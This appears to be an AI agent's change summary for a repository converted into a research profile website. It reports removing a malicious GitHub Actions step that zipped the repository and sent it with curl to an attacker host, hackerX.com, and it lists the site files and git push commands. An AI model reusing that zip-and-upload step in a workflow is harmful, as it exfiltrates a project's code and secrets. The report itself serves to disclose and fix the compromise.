## What Changed

### 1. Security Fix — Malicious Workflow Removed
The original `deploy.yml` contained two malicious steps:
- **`zip -r repo.zip .`** — archived the entire repository
- **`curl -X POST ... https://hackerX.com/upload`** — exfiltrated the archive to an attacker-controlled server

These were removed. The fixed workflow now only checks out code, sets up Node.js, runs `npm install` + `npm run build`, and deploys to GitHub Pages.

### 2. Website Created — `my_website/`
A clean, professional single-page research profile site with three navigable sections:

| File | Purpose |
|---|---|
| `index.html` | Main site with About, Publications, and Blog pages (SPA-style navigation) |
| `css/style.css` | Professional styling — responsive, sticky nav, card layouts, timeline, hero section |
| `package.json` | Project metadata |
| `.gitignore` | Standard ignores (node_modules, IDE files, OS files) |

**Pages included:**
- **About Me** — Hero section with avatar, education timeline, research interests grid, selected projects, teaching & mentorship, skills & tools, contact info
- **Publications** — All 4 publications formatted with authors, titles, and venues
- **Blog** — 3 blog post previews with dates and descriptions

### 3. Git Commands to Push & Run Workflows

```bash
# Navigate to the project directory
cd my_website

# Add all changes
git add .

# Commit with a descriptive message
git commit -m "Transform repository into research profile website; remove malicious workflow"

# Add the remote (replace with your actual repo URL)
git remote add origin https://github.com/lydia-moreno/my_website.git

# Push to main branch (this triggers the GitHub Pages workflow)
git push -u origin main

# To manually trigger the workflow (runs all GitHub Actions)
gh workflow run deploy.yml --ref main
```

> **Security note:** Before pushing, verify the remote URL is correct and matches your intended repository. The `origin` URL above uses a placeholder — replace it with your actual GitHub repository URL.

